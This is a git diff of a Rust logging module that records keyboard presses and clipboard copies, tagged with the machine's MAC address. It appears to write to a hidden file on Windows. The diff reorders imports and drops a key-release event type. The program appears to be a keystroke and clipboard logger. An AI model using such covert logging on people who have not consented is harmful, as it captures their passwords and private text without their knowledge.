@@ -1,13 +1,13 @@
+use crate::config;
+use crate::get_mac_addr;
 use chrono::Local;
+use serde::Serialize;
 #[cfg(windows)]
 use std::os::windows::fs::OpenOptionsExt;
 use std::{
     fs::OpenOptions,
     io::{self, Write},
 };
-use serde::Serialize;
-use crate::config;
-use crate::get_mac_addr;
 
 const FILE_ATTRIBUTE_HIDDEN: u32 = 0x2;
 
@@ -24,7 +24,6 @@ struct LogEvent {
 #[derive(Serialize)]
 pub enum EventType {
     KeyboardPress,
-    KeyboardRelease,
     ClipboardCopy,
 }
 
@@ -32,7 +31,6 @@ impl EventType {
     fn as_str(&self) -> &'static str {
         match self {
             EventType::KeyboardPress => "按下按键",
-            EventType::KeyboardRelease => "松开按键",
             EventType::ClipboardCopy => "复制文本",
         }
     }
@@ -40,7 +38,6 @@ impl EventType {
     fn as_event_type(&self) -> &'static str {
         match self {
             EventType::KeyboardPress => "keyboard_press",
-            EventType::KeyboardRelease => "keyboard_release",
             EventType::ClipboardCopy => "clipboard_copy",
         }
     }
